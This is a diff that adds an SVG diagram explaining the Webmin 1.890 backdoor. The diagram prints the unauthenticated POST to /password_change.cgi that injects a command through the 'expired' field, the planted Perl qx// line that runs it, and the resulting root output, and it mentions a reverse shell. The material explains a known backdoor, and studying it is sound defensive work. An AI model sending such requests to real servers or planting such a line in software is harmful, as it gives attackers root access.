@@ -1,0 +1,53 @@
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 900 350" width="900" height="350" role="img" aria-label="Diagram of the Webmin 1.890 backdoor request, the Perl qx code, and the root result">
+  <defs>
+    <marker id="arrow2" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse">
+      <path d="M 0 0 L 10 5 L 0 10 z" fill="#6366f1"/>
+    </marker>
+    <style>
+      .t { font-family: -apple-system, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+      .mono { font-family: "SFMono-Regular", Consolas, "Liberation Mono", Menlo, monospace; }
+      .card { fill: #12121a; stroke: #1e1e2e; stroke-width: 1.5; }
+      .title { fill: #e4e4ef; font-size: 20px; font-weight: 600; }
+      .sub { fill: #8888a0; font-size: 13px; }
+      .step { fill: #6366f1; font-size: 12px; font-weight: 700; letter-spacing: 0.08em; }
+      .head { fill: #e4e4ef; font-size: 14.5px; font-weight: 600; }
+      .body { fill: #a8a8bd; font-size: 12px; }
+      .path { fill: #c7c7dc; font-size: 11.5px; }
+    </style>
+  </defs>
+
+  <rect x="0.5" y="0.5" width="899" height="349" rx="14" fill="#0f0f16" stroke="#1e1e2e"/>
+
+  <text class="t title" x="32" y="44">One POST, one Perl backdoor, one root shell</text>
+  <text class="t sub" x="32" y="68">Webmin 1.890 runs the value of the expired field through a shell before checking any password</text>
+
+  <rect class="card" x="30" y="96" width="252" height="162" rx="10"/>
+  <text class="t step" x="48" y="120">1 · REQUEST</text>
+  <text class="t head" x="48" y="146">Unauthenticated POST</text>
+  <text class="t mono path" x="48" y="172">/password_change.cgi</text>
+  <text class="t mono path" x="48" y="189">user=gotroot</text>
+  <text class="t mono path" x="48" y="206">expired=id</text>
+  <text class="t mono path" x="48" y="223">Referer: .../login.cgi</text>
+
+  <rect class="card" x="324" y="96" width="252" height="162" rx="10" stroke="#6366f1"/>
+  <text class="t step" x="342" y="120">2 · BACKDOOR</text>
+  <text class="t head" x="342" y="146">Line 12 in the CGI</text>
+  <text class="t mono path" x="342" y="172">$in{'expired'} eq '' || die</text>
+  <text class="t mono path" x="342" y="189">$text{'password_expired'},</text>
+  <text class="t mono path" x="342" y="206">qx/$in{'expired'}/;</text>
+  <text class="t body" x="342" y="235">qx// invokes a shell as root</text>
+
+  <rect class="card" x="618" y="96" width="252" height="162" rx="10"/>
+  <text class="t step" x="636" y="120">3 · RESULT</text>
+  <text class="t head" x="636" y="146">Command output</text>
+  <text class="t mono path" x="636" y="172">uid=0(root)</text>
+  <text class="t body" x="636" y="197">or a reverse shell</text>
+  <text class="t mono path" x="636" y="223">/usr/share/webmin</text>
+  <text class="t body" x="636" y="242">Webmin runs as root</text>
+
+  <line x1="284" y1="177" x2="320" y2="177" stroke="#6366f1" stroke-width="2" marker-end="url(#arrow2)"/>
+  <line x1="578" y1="177" x2="614" y2="177" stroke="#6366f1" stroke-width="2" marker-end="url(#arrow2)"/>
+
+  <text class="t body" x="32" y="300">1.890 default install: the expired field is enough, and no credentials are needed.</text>
+  <text class="t body" x="32" y="320">1.900-1.920: the old field carries the payload, but expired-password changing must be enabled.</text>
+</svg>
